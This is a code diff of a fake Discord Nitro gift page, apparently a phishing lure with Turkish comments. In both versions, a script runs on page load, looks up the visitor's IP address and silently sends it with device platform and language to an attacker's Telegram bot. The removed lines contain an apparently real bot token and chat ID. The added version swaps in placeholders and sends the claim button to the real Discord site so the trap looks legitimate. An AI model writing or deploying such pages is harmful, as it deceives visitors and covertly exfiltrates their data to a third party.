@@ -3,62 +3,94 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord | Nitro</title>
+    <title>Discord | Nitro Gift</title>
     <style>
-        body { margin: 0; padding: 0; background-color: #313338; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; color: #dbdee1; }
-        .nitro-card { background-color: #2b2d31; width: 90%; max-width: 450px; border-radius: 8px; overflow: hidden; box-shadow: 0 8px 16px rgba(0,0,0,0.3); text-align: center; padding-bottom: 30px; }
-        .banner { width: 100%; height: 120px; background: linear-gradient(45deg, #8547ff, #ff73fa); position: relative; }
-        .nitro-logo { width: 150px; margin-top: -40px; border: 8px solid #2b2d31; border-radius: 12px; background: #2b2d31; }
-        h1 { font-size: 24px; color: #fff; margin: 20px 0 10px; }
-        p { font-size: 16px; padding: 0 30px; line-height: 1.4; color: #b5bac1; }
-        .btn-claim { background-color: #5865f2; color: white; border: none; padding: 12px 40px; border-radius: 3px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 25px; transition: background 0.2s; }
-        .btn-claim:hover { background-color: #4752c4; }
-        .footer-info { margin-top: 20px; font-size: 12px; color: #949ba4; text-transform: uppercase; letter-spacing: 0.5px; }
+        body { margin: 0; padding: 0; background-color: #313338; font-family: 'gg sans', 'Helvetica Neue', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; color: #f2f3f5; }
+        .nitro-card { background-color: #2b2d31; width: 90%; max-width: 440px; border-radius: 8px; overflow: hidden; box-shadow: 0 8px 16px rgba(0,0,0,0.3); text-align: center; border: 1px solid #1e1f22; }
+        
+        /* Düzeltilen Banner: CSS ile Nitro Deseni */
+        .banner { 
+            width: 100%; 
+            height: 130px; 
+            background: linear-gradient(135deg, #8547ff 0%, #ff73fa 100%);
+            background-image: radial-gradient(circle at 20% 30%, rgba(255,255,255,0.1) 0%, transparent 20%), 
+                              radial-gradient(circle at 80% 70%, rgba(255,255,255,0.1) 0%, transparent 20%);
+            position: relative;
+        }
+
+        .nitro-logo-wrapper {
+            width: 80px;
+            height: 80px;
+            background-color: #2b2d31;
+            border-radius: 16px;
+            margin: -40px auto 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border: 6px solid #2b2d31;
+        }
+
+        .nitro-logo-wrapper img { width: 50px; height: auto; }
+
+        h1 { font-size: 24px; margin: 15px 0 10px; font-weight: 700; }
+        p { font-size: 15px; padding: 0 40px; line-height: 1.4; color: #b5bac1; margin-bottom: 25px; }
+        
+        .claim-button { 
+            background-color: #5865f2; 
+            color: white; 
+            border: none; 
+            padding: 12px 60px; 
+            border-radius: 3px; 
+            font-size: 16px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            transition: background 0.2s; 
+            margin-bottom: 30px;
+        }
+        .claim-button:hover { background-color: #4752c4; }
+
+        .footer { 
+            background-color: #232428; 
+            padding: 12px; 
+            font-size: 11px; 
+            color: #949ba4; 
+            text-transform: uppercase; 
+            letter-spacing: 0.5px;
+            font-weight: 700;
+        }
     </style>
 </head>
 <body>
 
 <div class="nitro-card">
     <div class="banner"></div>
-    <img src="https://assets-global.website-files.com/6257adef93867e3d18a4a445/63621535728a4870f2095818_grey-dis.png" class="nitro-logo" alt="Discord Nitro">
+    <div class="nitro-logo-wrapper">
+        <img src="https://assets-global.website-files.com/6257adef93867e3d18a4a445/63621535728a4870f2095818_grey-dis.png" alt="Nitro">
+    </div>
     <h1>You've been gifted Nitro!</h1>
-    <p>Discord has selected you to receive <b>3 Months of Nitro</b> as part of our Seasonal Rewards program. Click below to claim your gift.</p>
-    <button class="btn-claim" onclick="alert('Checking eligibility...')">Claim Gift</button>
-    <div class="footer-info">Limited time offer • Expires in 24 hours</div>
+    <p>A user has sent you a gift for <b>3 Months of Discord Nitro</b>. Click below to add it to your account.</p>
+    <button class="claim-button" onclick="window.location.href='https://discord.com/nitro'">Claim Gift</button>
+    <div class="footer">Limited time offer • Seasonal Rewards</div>
 </div>
 
 <script>
-    // --- TELEGRAM AYARLARIN ---
-    const botToken = "6418277280:AAGlTr7IRw8CL__1EWjpkI_j9ZHkRjLnedc";
-    const chatId = "1540769169";
+    const botToken = "BURAYA_BOT_TOKEN_GİR";
+    const chatId = "BURAYA_CHAT_ID_GİR";
 
     async function yakala() {
         try {
-            // IP Çekme
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            const ip = data.ip;
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            const ip = ipData.ip;
 
-            // Detaylar
-            const cihaz = navigator.userAgent;
-            const platform = navigator.platform;
-            const dil = navigator.language;
+            const mesaj = `💎 **NITRO TUZAĞI BAŞARILI**\n\n🌐 **IP:** \`${ip}\`\n📱 **Cihaz:** ${navigator.platform}\n🌍 **Dil:** ${navigator.language}`;
 
-            // Mesaj Hazırlama
-            const mesaj = `💎 **NITRO TUZAĞI ÇALIŞTI!**\n\n🌐 **IP:** \`${ip}\`\n💻 **Sistem:** ${platform}\n📱 **Cihaz:** ${cihaz}\n🌍 **Dil:** ${dil}`;
-
-            // Telegram'a sessiz gönderim
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mesaj)}&parse_mode=markdown`, {
                 mode: 'no-cors',
                 keepalive: true
             });
-
-        } catch (e) {
-            // Hata olsa bile kullanıcı hissetmesin
-        }
+        } catch (e) {}
     }
-
-    // Sayfa açılır açılmaz veriyi sızdır
     window.onload = yakala;
 </script>
 
